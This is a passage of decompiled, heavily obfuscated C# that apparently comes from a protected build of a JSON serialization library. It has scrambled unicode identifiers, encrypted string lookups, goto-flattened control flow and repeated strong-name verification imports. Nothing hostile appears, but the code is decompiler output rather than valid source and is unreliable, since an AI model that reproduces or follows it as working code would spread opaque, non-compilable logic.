      goto label_15;
label_6:
      if ((object) \u008C\u0002.\u007E\u0004\u0006((object) obj0) != null)
        num1 = \u0015\u0002.\u007E\u001A\u0005((object) \u008C\u0002.\u007E\u0004\u0006((object) obj0)) ? 1 : 0;
      else
        goto label_13;
label_10:
      if (num1 != 0)
      {
        if (true)
          return true;
        goto label_4;
      }
label_13:
      if (true)
        num2 = 0;
      else
        goto label_1;
label_15:
      if (num2 == 0)
        return num2 != 0;
      num1 = num2;
      goto label_2;
    }

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

    static IList \u0001(
      ref bool _param0,
      \u0012.\u0007 _param1,
      [Out] \u0001.\u0007 _param2,
      [In] JsonSerializerInternalReader obj3)
    {
      if (false)
        goto label_24;
      else
        goto label_27;
label_6:
      _param0 = false;
      return (IList) _param2.\u0003(new object[0]);
label_24:
      if (true)
        throw \u0014.\u0006.\u0001(_param1, \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(11362), (IFormatProvider) \u0098.\u0002\u0004(), (object) ((\u0016.\u0007) _param2).\u0002()));
      goto label_6;
label_27:
      int num;
      for (int index = _param2.\u0004() ? 1 : 0; index != 0; index = num)
      {
        IList list;
        if (_param2.\u0003 != null)
        {
          if (_param2.\u0005())
          {
            if (true)
            {
              _param0 = true;
              return \u0014.\u0006.\u0001(_param2);
            }
          }
          else
            goto label_6;
        }
        else
        {
          if (true)
          {
            num = ((\u0016.\u0007) _param2).\u0004 ? 1 : 0;
            if (false)
              continue;
            if (num != 0)
            {
              _param0 = true;
              list = \u0014.\u0006.\u0001(_param2);
              if (_param2.\u0003())
              {
                list = (IList) \u0014.\u0006.\u0001(_param2, (object) list);
                goto label_12;
              }
              else
                goto label_12;
            }
            else if (((\u0016.\u0007) _param2).\u0001() == null)
              goto label_21;
          }
          else
            goto label_15;
label_14:
          if (!_param2.\u0006())
            goto label_16;
label_15:
          if (obj3.\u0001.\u0001 != \u0001.\u0002.\u0002)
            goto label_21;
label_16:
          if (true)
          {
            object obj = ((\u0016.\u0007) _param2).\u0001()();
            if (true)
            {
              if (_param2.\u0003())
                obj = (object) \u0014.\u0006.\u0001(_param2, obj);
              _param0 = false;
              return (IList) obj;
            }
            goto label_14;
          }
          else
            goto label_14;
label_21:
          if (\u0014.\u0006.\u0001(_param2))
          {
            _param0 = true;
            return \u0014.\u0006.\u0001(_param2);
          }
          if (_param2.\u0006)
            throw \u0014.\u0006.\u0001(_param1, \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(20964), (IFormatProvider) \u0098.\u0002\u0004(), (object) ((\u0016.\u0007) _param2).\u0002()));
          goto label_24;
        }
label_12:
        return list;
      }
      throw \u0014.\u0006.\u0001(_param1, \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(20907), (IFormatProvider) \u0098.\u0002\u0004(), (object) ((\u0016.\u0007) _param2).\u0002));
    }

    static JsonContainerType \u0001([In] JsonWriter obj0) => obj0.\u0001.\u0001;

    static bool \u0001(
      \u0004.\u0001 _param0,
      CultureInfo _param1,
      ref DateTime _param2,
      \u0015.\u0008 _param3,
      [Out] string _param4)
    {
      int num1;
      int num2;
      int num3;
      if (true)
      {
        if (_param3.\u0002() > 0)
        {
          int num4 = _param3.\u0001();
          if (true)
            goto label_23;
label_3:
          if (true)
          {
            if (num4 != 47)
            {
              num2 = _param3.\u0002();
              goto label_11;
            }
            else
              goto label_5;
          }
          else
          {
            num3 = num4;
            goto label_14;
          }
label_23:
          num1 = num4;
          num4 = (int) _param3[num1];
          goto label_3;
        }
        else
          goto label_22;
      }
label_5:
      int num5;
      if (_param3.\u0002() >= 9)
      {
        num2 = \u0014.\u0003.\u0001(_param3, \u0014.\u0006.\u0082(17828)) ? 1 : 0;
        if (true)
        {
          if (num2 != 0)
          {
            int num6 = \u0014.\u0003.\u0002(_param3, \u0014.\u0006.\u0082(17837)) ? 1 : 0;
            if (true)
            {
              if (num6 != 0 && \u0014.\u0006.\u0001(_param0, _param3, out _param2))
                return true;
              goto label_18;
            }
            else
            {
              num5 = num6;
              goto label_20;
            }
          }
          else
            goto label_18;
        }
      }
      else
        goto label_18;
label_11:
      int num7 = 19;
label_12:
      if (num2 >= num7)
        num3 = _param3.\u0002();
      else
        goto label_18;
label_14:
      if (num3 <= 40 && \u009A.\u000E\u0004(_param3[num1]))
      {
        int num8 = (int) _param3[num1 + 10];
        int num9 = 84;
        if (num9 == 0)
        {
          num7 = num9;
          num2 = num8;
          goto label_12;
        }
        else if (num8 == num9 && \u0014.\u0006.\u0001(ref _param2, _param0, _param3))
          return true;
      }
label_18:
      if (!global::\u0007.\u009E(_param4))
        num5 = \u0014.\u0006.\u0001(_param0, _param3.ToString(), ref _param2, _param4, _param1) ? 1 : 0;
      else
        goto label_22;
label_20:
      if (num5 != 0)
        return true;
label_22:
      _param2 = new DateTime();
      return false;
    }

    static void \u0001([In] char obj0, [In] char[] obj1)
    {
      do
      {
        obj1[0] = '\\';
        obj1[1] = 'u';
        if (true)
          obj1[2] = \u0014.\u0006.\u0001((int) obj0 >> 12 & 15);
        obj1[3] = \u0014.\u0006.\u0001((int) obj0 >> 8 & 15);
      }
      while (false);
      obj1[4] = \u0014.\u0006.\u0001((int) obj0 >> 4 & 15);
      obj1[5] = \u0014.\u0006.\u0001((int) obj0 & 15);
    }

    static void \u0001([In] \u0011.\u0003 obj0)
    {
      while (!\u0014.\u0006.\u0001(obj0, \u0015.\u0006.\u0006))
      {
        if (true)
          throw \u0014.\u0006.\u0001((\u0012.\u0007) obj0, \u0014.\u0006.\u0082(21082));
      }
      \u0011.\u0003 obj = ((\u0012.\u0007) obj0).\u0001 != \u0015.\u0002.\u0002 ? obj0 : throw new JsonReaderException(\u0014.\u0006.\u0082(21033));
      // ISSUE: variable of a boxed type
      __Boxed<double> local = (System.ValueType) double.NegativeInfinity;
      if (false)
        return;
      \u0014.\u0006.\u0001((\u0012.\u0007) obj, JsonToken.Float, (object) local);
    }

    static \u0015.\u0013 \u0001([In] JsonSerializerInternalReader obj0, [In] \u0012.\u0007 obj1)
    {
      \u0014.\u0006.\u0001((object) obj1, \u0014.\u0006.\u0082(3503));
      \u0015.\u0013 obj2;
      do
      {
        \u0008.\u0010 obj3 = new \u0008.\u0010();
        try
        {
          if (true)
          {
            \u0008.\u0010 obj4 = obj3;
            if (true)
              obj4.\u0002();
          }
          do
          {
            if (obj1.\u0001() == JsonToken.PropertyName)
            {
              string str = (string) obj1.\u0001();
              if (\u0014.\u0006.\u0001(obj1))
              {
                if (!\u0014.\u0006.\u0001(obj1, str, obj0))
                {
                  obj3.\u0002(str);
                  \u0014.\u0006.\u0001(obj1, false, true, (JsonWriter) obj3, true);
                  goto label_7;
                }
                else
                  goto label_7;
              }
              else
                break;
            }
label_5:
            if (obj1.\u0001() != JsonToken.Comment)
              goto label_6;
label_7:
            if (false)
              goto label_5;
          }
          while (obj1.\u0001());
          goto label_9;
label_6:
          obj3.\u0011();
          obj2 = \u0014.\u0006.\u0001(obj3);
          goto label_16;
label_9:
          throw \u0014.\u0006.\u0001(obj1, \u0014.\u0006.\u0082(10226));
        }
        finally
        {
          if (obj3 != null)
            global::\u0011.\u007E\u0007\u0002((object) obj3);
        }
label_16:;
      }
      while (false);
      return obj2;
    }

    static \u0013.\u000F.\u0004 \u0001([In] \u0013.\u000F.\u0005 obj0)
    {
      byte[] destinationArray = new byte[obj0.\u0002];
      Array.Copy((Array) obj0.\u0002, 0, (Array) destinationArray, 0, obj0.\u0002);
      return new \u0013.\u000F.\u0004(destinationArray);
    }

    static string \u0001() => \u0014.\u0006.\u0082(9184);

    static \u000E.\u0005 \u0001([In] \u0016.\u0001 obj0)
    {
      \u000E.\u0005? nullable = obj0.\u0001;
      int num = nullable.HasValue ? 1 : 0;
      if (false)
        return (\u000E.\u0005) num;
      return num == 0 ? \u000E.\u0005.\u0001 : nullable.GetValueOrDefault();
    }

    static string \u0001() => \u0006\u0003.\u007E\u008C\u0006((object) \u0014.\u0006.\u0001(), \u0014.\u0006.\u0082(21135), \u0005.\u0001.\u0001);

    static bool \u0001([In] System.Type obj0)
    {
      while (true)
      {
        \u0014.\u0006.\u0001((object) obj0, \u0014.\u0006.\u0082(8396));
        int num = \u0015.\u000E.\u0003(obj0) ? 1 : 0;
        if (false)
          return num != 0;
        if (false)
          return num != 0;
        if (num != 0)
        {
          if (true)
          {
            // ISSUE: type reference
            return (object) \u0001\u0002.\u007E\u001E\u0004((object) obj0) == (object) \u0004\u0002.\u0084\u0004(__typeref (Nullable<>));
          }
        }
        else
          break;
      }
      return false;
    }

    static byte[] \u0001([In] Stream obj0)
    {
      byte[] numArray = new byte[\u0098\u0004.\u007E\u0092\u0008((object) obj0)];
      int num = \u0008\u0004.\u007E\u009C\u0007((object) obj0, numArray, 0, numArray.Length);
      return numArray;
    }

    static void \u0001([In] System.Type obj0, [In] JsonProperty obj1)
    {
      if (true)
      {
        if ((object) obj1.\u0001 != (object) obj0)
          goto label_4;
      }
      else
        goto label_5;
label_3:
      if (true)
        return;
label_4:
      obj1.\u0001 = obj0;
label_5:
      obj1.\u0002 = false;
      goto label_3;
    }

    static string \u0001([In] string obj0, [In] double obj1) => \u0097\u0004.\u0091\u0008(obj1) || \u0097\u0004.\u0090\u0008(obj1) || \u0086\u0004.\u007E\u001E\u0008((object) obj0, '.') != -1 || \u0086\u0004.\u007E\u001E\u0008((object) obj0, 'E') != -1 || \u0086\u0004.\u007E\u001E\u0008((object) obj0, 'e') != -1 ? obj0 : global::\u0006.\u009B(obj0, \u0014.\u0006.\u0082(21164));

    static void \u0001([In] \u0012.\u0007 obj0, [In] string obj1)
    {
      \u0014.\u0006.\u0001(obj0);
      if (obj0.\u0001() != JsonToken.PropertyName || !\u008E\u0002.\u0007\u0006(global::\u0001.\u007E\u0001(obj0.\u0001()), obj1, StringComparison.OrdinalIgnoreCase))
        throw new JsonSerializationException(\u0002.\u0002.\u0001(\u0014.\u0006.\u0082(21169), (IFormatProvider) \u0098.\u0002\u0004(), (object) obj1));
    }

    static void \u0001([In] \u0012.\u0007 obj0)
    {
      if (!obj0.\u0001())
        throw \u0014.\u0006.\u0001(obj0);
    }

    static IList<\u0008.\u000E> \u0001([In] \u0016.\u0007 obj0)
    {
      if (obj0.\u0002 == null)
        obj0.\u0002 = (IList<\u0008.\u000E>) new List<\u0008.\u000E>();
      return obj0.\u0002;
    }

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

    static DynamicMethod \u0001([In] string obj0, [In] System.Type obj1, [In] System.Type[] obj2, [In] System.Type obj3)
    {
      do
      {
        while (!\u0015.\u000E.\u0002(obj3))
        {
          if (true)
            return new DynamicMethod(obj0, obj1, obj2, obj3, true);
        }
      }
      while (false);
      return new DynamicMethod(obj0, obj1, obj2, \u0099\u0004.\u007E\u0093\u0008((object) obj3), true);
    }

    static unsafe IEnumerable<PropertyInfo> \u0001(
      [In] BindingFlags obj0,
      [In] System.Type obj1)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(8);
      \u0014.\u0006.\u0001((object) obj1, \u0014.\u0006.\u0082(5976));
      List<PropertyInfo> propertyInfoList = new List<PropertyInfo>((IEnumerable<PropertyInfo>) obj1.GetProperties(obj0));
      int num1;
      int num2;
      if (\u0015.\u000E.\u0002(obj1))
      {
        System.Type[] interfaces = obj1.GetInterfaces();
        *(int*) voidPtr = 0;
        int num3;
        int length;
        while (true)
        {
          num3 = *(int*) voidPtr;
          length = interfaces.Length;
          if (true)
          {
            int num4 = length;
            if (num3 < num4)
            {
              System.Type type = interfaces[*(int*) voidPtr];
              propertyInfoList.AddRange((IEnumerable<PropertyInfo>) type.GetProperties(obj0));
              *(int*) voidPtr = *(int*) voidPtr + 1;
            }
            else
              goto label_6;
          }
          else
            break;
        }
        num2 = length;
        num1 = num3;
        goto label_11;
      }
label_6:
      \u0014.\u0006.\u0001((IList<PropertyInfo>) propertyInfoList, obj1, obj0);
      *(int*) ((IntPtr) voidPtr + 4) = 0;
label_10:
      num1 = *(int*) ((IntPtr) voidPtr + 4);
      num2 = propertyInfoList.Count;
label_11:
      if (num1 >= num2)
        return (IEnumerable<PropertyInfo>) propertyInfoList;
      PropertyInfo propertyInfo1 = propertyInfoList[*(int*) ((IntPtr) voidPtr + 4)];
      if ((object) propertyInfo1.DeclaringType != (object) obj1)
      {
        PropertyInfo propertyInfo2 = (PropertyInfo) \u0014.\u0006.\u0001(propertyInfo1.DeclaringType, (MemberInfo) propertyInfo1);
        propertyInfoList[*(int*) ((IntPtr) voidPtr + 4)] = propertyInfo2;
      }
      *(int*) ((IntPtr) voidPtr + 4) = *(int*) ((IntPtr) voidPtr + 4) + 1;
      goto label_10;
    }

    static int \u0001([In] \u0015.\u0013 obj0)
    {
      \u0006.\u0005 obj = \u0014.\u0006.\u0001(obj0);
      if (obj == null || !\u0014.\u0006.\u0001(false, \u0015.\u0013.\u0002, (\u0015.\u0013) obj))
        throw new ArgumentException(\u0002.\u0002.\u0001(\u0014.\u0006.\u0082(21210), (IFormatProvider) \u0098.\u0002\u0004(), (object) \u0014.\u0006.\u0001(obj0)));
      return \u009A\u0004.\u0094\u0008(obj.\u0001, (IFormatProvider) \u0098.\u0002\u0004());
    }

    static System.Type \u0001([In] \u0015.\u0007 obj0, [In] string obj1) => obj0.\u0001()[obj1].\u0001();

    static System.Type \u0001([In] System.Type obj0)
    {
      \u0014.\u0006.\u0001((object) obj0, \u0014.\u0006.\u0082(4722));
      if (\u0015\u0002.\u007E\u0015\u0005((object) obj0))
        return \u0001\u0002.\u007E\u001A\u0004((object) obj0);
      if (true)
        goto label_9;
label_8:
      throw new Exception(\u0002.\u0002.\u0001(\u0014.\u0006.\u0082(21251), (IFormatProvider) \u0098.\u0002\u0004(), (object) obj0));
label_9:
      System.Type type;
      // ISSUE: type reference
      if (\u0014.\u0006.\u0001(obj0, \u0004\u0002.\u0084\u0004(__typeref (IEnumerable<>)), out type))
        return !\u0015.\u000E.\u0004(type) ? \u008F\u0002.\u007E\u000E\u0006((object) type)[0] : throw new Exception(\u0002.\u0002.\u0001(\u0014.\u0006.\u0082(21251), (IFormatProvider) \u0098.\u0002\u0004(), (object) obj0));
      // ISSUE: type reference
      if (\u0093\u0002.\u007E\u0012\u0006((object) \u0004\u0002.\u0084\u0004(__typeref (IEnumerable)), obj0))
        return (System.Type) null;
      goto label_8;
    }

    static Func<object, object> \u0001([In] \u0004.\u0006.\u0001 obj0)
    {
      MethodInfo method;
      // ISSUE: variable of a compiler-generated type
      \u0004.\u0006.\u0003 obj;
      if (true)
      {
        if (true)
        {
          // ISSUE: object of a compiler-generated type is created
          obj = new \u0004.\u0006.\u0003();
          method = obj0.\u0002().GetMethod(\u0014.\u0006.\u0082(21292), new System.Type[1]
          {
            obj0.\u0001()
          });
          goto label_7;
        }
      }
      else
        goto label_7;
label_3:
      if ((object) method == null)
        return (Func<object, object>) null;
      // ISSUE: reference to a compiler-generated field
      obj.\u0001 = \u0014.\u0006.\u0001().\u0001<object>((MethodBase) method);
      // ISSUE: reference to a compiler-generated method
      return new Func<object, object>(obj.\u0001);
label_7:
      if ((object) method == null)
      {
        method = obj0.\u0002().GetMethod(\u0014.\u0006.\u0082(21309), new System.Type[1]
        {
          obj0.\u0001()
        });
        goto label_3;
      }
      else
        goto label_3;
    }

    static bool \u0001([In] int obj0, [In] char[] obj1, [In] string obj2, [In] int obj3)
    {
      int num1 = \u001F.\u007E\u0011\u0003((object) obj2);
label_1:
      if (true)
        goto label_14;
label_7:
      if (num1 == 0)
      {
        if (num1 == 0)
          return num1 != 0;
      }
      else
        goto label_1;
label_11:
      int num2 = num1;
label_12:
      if (num2 >= \u001F.\u007E\u0011\u0003((object) obj2))
        return true;
      int num3 = (int) \u001B\u0002.\u007E\u0088\u0005((object) obj2, num2);
      if (true)
        goto label_15;
label_10:
      num1 = num3 + 1;
      goto label_11;
label_15:
      int num4 = (int) obj1[obj3 + num2];
      if (num3 != num4)
      {
        num1 = 0;
        goto label_7;
      }
      else
      {
        num3 = num2;
        goto label_10;
      }
label_14:
      if (num1 != obj0)
        return false;
      num2 = 0;
      goto label_12;
    }

    static string \u0001([In] XmlNodeConverter obj0, [In] \u0012.\u0007 obj1)
    {
      if (obj1.\u0001() == JsonToken.String)
        return obj1.\u0001() == null ? (string) null : global::\u0001.\u007E\u0001(obj1.\u0001());
      if (obj1.\u0001() == JsonToken.Integer)
        return \u009B\u0004.\u0095\u0008(\u0082\u0003.\u0014\u0007(obj1.\u0001(), (IFormatProvider) \u0098.\u0002\u0004()));
      if (obj1.\u0001() == JsonToken.Float)
      {
        if (obj1.\u0001() is Decimal)
          return \u009C\u0004.\u0096\u0008((Decimal) obj1.\u0001());
        return obj1.\u0001() is float ? \u009D\u0004.\u0097\u0008((float) obj1.\u0001()) : \u009E\u0004.\u0098\u0008(\u008B\u0002.\u0002\u0006(obj1.\u0001(), (IFormatProvider) \u0098.\u0002\u0004()));
      }
      if (obj1.\u0001() == JsonToken.Boolean)
        return \u009F\u0004.\u0099\u0008(\u0090\u0003.\u0081\u0007(obj1.\u0001(), (IFormatProvider) \u0098.\u0002\u0004()));
      if (obj1.\u0001() == JsonToken.Date)
      {
        if (obj1.\u0001() is DateTimeOffset)
          return \u0001\u0005.\u009A\u0008((DateTimeOffset) obj1.\u0001());
        if (true)
        {
          DateTime dateTime = \u0091\u0003.\u0082\u0007(obj1.\u0001(), (IFormatProvider) \u0098.\u0002\u0004());
          return \u0002\u0005.\u009B\u0008(dateTime, \u0014.\u0006.\u0001(dateTime.Kind));
        }
      }
      else if (obj1.\u0001() != JsonToken.Null)
        throw \u0014.\u0006.\u0001(obj1, \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(21326), (IFormatProvider) \u0098.\u0002\u0004(), (object) obj1.\u0001()));
      return (string) null;
    }

    static void \u0001([In] \u0011.\u0003 obj0, [In] bool obj1)
    {
      ++obj0.\u0002;
      if (\u0014.\u0006.\u0001(obj0, 1, obj1) && obj0.\u0001[obj0.\u0002] == '\n')
        goto label_2;
label_1:
      \u0014.\u0006.\u0001(obj0, obj0.\u0002);
      return;
label_2:
      ++obj0.\u0002;
      goto label_1;
    }

    static Assembly \u0001([In] AssemblyName obj0)
    {
      AppDomain appDomain = \u0097\u0003.\u0089\u0007();
      Assembly[] assemblyArray1 = \u0098\u0003.\u007E\u008A\u0007((object) appDomain);
      Assembly[] assemblyArray2;
      if (true)
        assemblyArray2 = assemblyArray1;
      Assembly[] assemblyArray3 = assemblyArray2;
      int index1 = 0;
label_5:
      if (index1 >= assemblyArray3.Length)
        return (Assembly) null;
      Assembly assembly = assemblyArray3[index1];
      AssemblyName assemblyName = \u0003\u0005.\u007E\u009C\u0008((object) assembly);
      int num;
      for (int index2 = \u008E\u0002.\u0007\u0006(global::\u0001.\u007E\u0017((object) assemblyName), global::\u0001.\u007E\u0017((object) obj0), StringComparison.InvariantCultureIgnoreCase) ? 1 : 0; index2 == 0 || !\u008E\u0002.\u0007\u0006(\u0014.\u0006.\u0001(\u0004\u0005.\u007E\u009D\u0008((object) assemblyName)), \u0014.\u0006.\u0001(\u0004\u0005.\u007E\u009D\u0008((object) obj0)), StringComparison.InvariantCultureIgnoreCase); index2 = num)
      {
        num = index1 + 1;
        if (true)
        {
          index1 = num;
          goto label_5;
        }
      }
      return assembly;
    }

    static System.Type \u0001([In] \u0016.\u0007 obj0) => obj0.\u0002;

    static void \u0001([In] JsonWriter obj0, [In] \u0004.\u0001 obj1)
    {
      if (obj1 >= \u0004.\u0001.\u0001)
      {
        while (obj1 <= \u0004.\u0001.\u0004)
        {
          do
          {
            obj0.\u0001 = obj1;
          }
          while (false);
          if (true)
            return;
        }
      }
      throw new ArgumentOutOfRangeException(\u0014.\u0006.\u0082(4207));
    }

    static void \u0001([In] \u0005.\u0004 obj0, [In] string obj1, [In] bool obj2)
    {
      \u0014.\u0006.\u0001(obj0);
      if (false)
        return;
      TextWriter textWriter = obj0.\u0001;
      char ch = obj0.\u0002;
      \u0001.\u0003 obj3;
      \u0004.\u0003<char> obj4;
      bool[] flagArray;
      do
      {
        flagArray = obj0.\u0001;
        if (true)
          goto label_8;
label_2:
        if (true)
          obj4 = obj0.\u0001;
        continue;
label_8:
        obj3 = ((JsonWriter) obj0).\u0001;
        goto label_2;
      }
      while (false);
      ref char[] local = ref obj0.\u0001;
      \u0014.\u0006.\u0001(flagArray, ref local, obj2, obj4, textWriter, obj3, obj1, ch);
    }

    static void \u0001([In] \u0012.\u0007 obj0, [In] JsonSerializerInternalReader obj1, [In] int obj2, [In] bool obj3)
    {
      if (true)
        goto label_9;
label_2:
      int num1;
      if (true)
      {
        int num2 = obj0.\u0001() ? 1 : 0;
        if (true)
        {
          if (num2 == 0)
            return;
        }
        else
        {
          num1 = num2;
          goto label_8;
        }
      }
label_5:
      if (true)
        num1 = obj0.\u0001();
      else
        goto label_2;
label_8:
      int num3 = obj2 + 1;
      if (num1 <= num3)
        return;
      goto label_2;
label_9:
      JsonSerializerInternalReader serializerInternalReader = obj1;
      if (true)
        \u0014.\u0006.\u0001((\u0016.\u0008) serializerInternalReader);
      if (!obj3)
        return;
      \u0014.\u0006.\u0001(obj0);
      goto label_5;
    }

    static bool? \u0001([In] \u0012.\u0007 obj0, [In] string obj1)
    {
      if (true)
        goto label_7;
label_4:
      if (true)
        \u0014.\u0006.\u0001(obj0, JsonToken.String, (object) obj1, false);
      else
        goto label_10;
label_6:
      throw \u0014.\u0006.\u0001(obj0, \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(21399), (IFormatProvider) CultureInfo.InvariantCulture, (object) obj1));
label_7:
      if (string.IsNullOrEmpty(obj1))
      {
        if (true)
          goto label_8;
label_2:
        bool? nullable;
        if (true)
          return nullable;
        goto label_10;
label_8:
        \u0014.\u0006.\u0001(obj0, JsonToken.Null, (object) null, false);
        nullable = new bool?();
        goto label_2;
      }
label_10:
      bool result;
      if (bool.TryParse(obj1, out result))
      {
        if (true)
        {
          \u0014.\u0006.\u0001(obj0, JsonToken.Boolean, (object) result, false);
          return new bool?(result);
        }
        goto label_6;
      }
      else
        goto label_4;
    }

    static void \u0001([In] \u0012.\u0007 obj0, [In] bool obj1)
    {
      if (obj0.\u0001.\u0001 == JsonContainerType.None)
        goto label_6;
label_5:
      obj0.\u0001 = \u0012.\u0007.\u0001.\u000E;
      goto label_7;
label_6:
      \u0014.\u0006.\u0001(obj0);
label_7:
      do
      {
        if (obj1)
        {
          if (true)
            \u0014.\u0006.\u0001(obj0);
        }
      }
      while (false);
      if (false)
        goto label_5;
    }

    static bool \u0001(ref System.Type _param0, System.Type _param1, [Out] System.Type _param2)
    {
      \u0014.\u0006.\u0001((object) _param1, \u0014.\u0006.\u0082(4722));
      \u0014.\u0006.\u0001((object) _param2, \u0014.\u0006.\u0082(21456));
      return \u0015.\u000E.\u0006(_param2) && \u0015.\u000E.\u0004(_param2) ? \u0014.\u0006.\u0001(_param1, _param2, out _param0) : throw new ArgumentNullException(\u0002.\u0002.\u0001(\u0014.\u0006.\u0082(21489), (IFormatProvider) \u0098.\u0002\u0004(), (object) _param2));
    }

    static void \u0001([In] \u0011.\u0003 obj0)
    {
      if (!\u0014.\u0006.\u0001(obj0, \u0015.\u0006.\u0002))
        throw \u0014.\u0006.\u0001((\u0012.\u0007) obj0, \u0014.\u0006.\u0082(16666));
      \u0014.\u0006.\u0001((\u0012.\u0007) obj0, JsonToken.Boolean, (object) false);
    }

    static \u0015.\u0013 \u0001([In] \u0015.\u0013 obj0) => obj0.\u0001;

    static int \u0001([In] \u0013.\u000F.\u0007 obj0) => obj0.ReadByte() | obj0.ReadByte() << 8;

    static string \u0001([In] string obj0)
    {
      while (\u0086\u0004.\u007E\u001E\u0008((object) obj0, '.') == -1)
      {
        if (true)
          return global::\u0006.\u009B(obj0, \u0014.\u0006.\u0082(21164));
      }
      return obj0;
    }

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

    static void \u0001([In] \u0015.\u0013 obj0, [In] int obj1, [In] int obj2) => \u0014.\u0006.\u0001((object) new \u0015.\u0013.\u0001(obj1, obj2), obj0);

    static unsafe int \u0001([In] \u0013.\u000F.\u0004 obj0, [In] \u0013.\u000F.\u0002 obj1)
    {
      int num1;
      void* voidPtr;
      if (true)
      {
        int num2 = 16;
        int index;
        int num3;
        while (true)
        {
          // ISSUE: untyped stack allocation
          voidPtr = (void*) __untypedstackalloc(num2);
          if ((index = \u0014.\u0006.\u0001(obj1, 9)) >= 0)
          {
            if ((num1 = (int) obj0.\u0001[index]) >= 0)
            {
              if (true)
              {
                \u0014.\u0006.\u0001(obj1, num1 & 15);
                num3 = num1;
                if (false)
                  num2 = num3;
                else
                  break;
              }
              else
                goto label_8;
            }
            else
              goto label_5;
          }
          else
            goto label_13;
        }
        return num3 >> 4;
label_5:
        *(int*) voidPtr = -(num1 >> 4);
        *(int*) ((IntPtr) voidPtr + 4) = num1 & 15;
        int num4;
        if ((num4 = \u0014.\u0006.\u0001(obj1, *(int*) ((IntPtr) voidPtr + 4))) >= 0)
        {
          int num5 = (int) obj0.\u0001[*(int*) voidPtr | num4 >> 9];
          \u0014.\u0006.\u0001(obj1, num5 & 15);
          return num5 >> 4;
        }
        *(int*) ((IntPtr) voidPtr + 8) = obj1.\u0003;
        index = \u0014.\u0006.\u0001(obj1, *(int*) ((IntPtr) voidPtr + 8));
        num1 = (int) obj0.\u0001[*(int*) voidPtr | index >> 9];
label_8:
        if (true)
        {
          if ((num1 & 15) > *(int*) ((IntPtr) voidPtr + 8))
            return -1;
          \u0014.\u0006.\u0001(obj1, num1 & 15);
          if (true)
            return num1 >> 4;
          goto label_14;
        }
        else
          goto label_16;
label_13:
        *(int*) ((IntPtr) voidPtr + 12) = obj1.\u0003;
        index = \u0014.\u0006.\u0001(obj1, *(int*) ((IntPtr) voidPtr + 12));
label_14:
        num1 = (int) obj0.\u0001[index];
      }
      if (num1 < 0)
        goto label_18;
label_16:
      if ((num1 & 15) <= *(int*) ((IntPtr) voidPtr + 12))
      {
        \u0014.\u0006.\u0001(obj1, num1 & 15);
        return num1 >> 4;
      }
label_18:
      return -1;
    }

    static TimeSpan \u0001([In] string obj0) => \u0005\u0005.\u009E\u0008(obj0);

    static unsafe int? \u0001([In] string obj0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(8);
      if (true)
        goto label_14;
label_6:
      if (true)
        *(int*) voidPtr = *(int*) voidPtr - 1;
      else
        goto label_13;
label_10:
      *(int*) ((IntPtr) voidPtr + 4) = *(int*) ((IntPtr) voidPtr + 4) + 1;
label_11:
      int? nullable;
      if (*(int*) ((IntPtr) voidPtr + 4) >= obj0.Length)
      {
        nullable = new int?();
      }
      else
      {
        int num1 = (int) obj0[*(int*) ((IntPtr) voidPtr + 4)];
        char ch;
        if (true)
          ch = (char) num1;
        if (ch == ',')
        {
          if (*(int*) voidPtr == 0)
            return new int?(*(int*) ((IntPtr) voidPtr + 4));
          goto label_10;
        }
        else
        {
          int num2;
          int num3;
          do
          {
            int num4 = (int) ch;
            int num5 = 91;
            while (true)
            {
              if (num4 != num5)
              {
                num2 = (int) ch;
                num3 = 93;
                if (num3 == 0)
                {
                  num5 = num3;
                  num4 = num2;
                }
                else
                  goto label_4;
              }
              else
                break;
            }
            *(int*) voidPtr = *(int*) voidPtr + 1;
          }
          while (false);
          goto label_10;
label_4:
          if (num2 == num3)
            goto label_6;
          else
            goto label_10;
        }
      }
label_13:
      return nullable;
label_14:
      *(int*) voidPtr = 0;
      *(int*) ((IntPtr) voidPtr + 4) = 0;
      goto label_11;
    }

    static void \u0001([In] \u0013.\u000F.\u0002 obj0, [In] int obj1)
    {
label_0:
      obj0.\u0001 >>= obj1;
      do
      {
        if (true)
          obj0.\u0003 -= obj1;
        else
          goto label_0;
      }
      while (false);
    }

    static int? \u0001([In] \u0012.\u0007 obj0) => obj0.\u0001;

    static string \u0001([In] string obj0, [In] char obj1, [In] bool obj2, [In] \u0001.\u0003 obj3)
    {
      bool[] flagArray = \u0014.\u0006.\u0001(obj1, obj3);
      StringWriter stringWriter = \u0014.\u0006.\u0001(\u0014.\u0006.\u0001(obj0) ?? 16);
      try
      {
        char[] chArray = (char[]) null;
        \u0014.\u0006.\u0001(flagArray, ref chArray, obj2, (\u0004.\u0003<char>) null, (TextWriter) stringWriter, obj3, obj0, obj1);
        return global::\u0001.\u007E\u0001((object) stringWriter);
      }
      finally
      {
        if (stringWriter != null)
          global::\u0011.\u007E\u0007\u0002((object) stringWriter);
      }
    }

    static DateTimeOffset? \u0001([In] \u0012.\u0007 obj0, [In] string obj1)
    {
      while (true)
      {
        if (string.IsNullOrEmpty(obj1))
        {
          \u0014.\u0006.\u0001(obj0, JsonToken.Null, (object) null, false);
          break;
        }
        DateTimeOffset result;
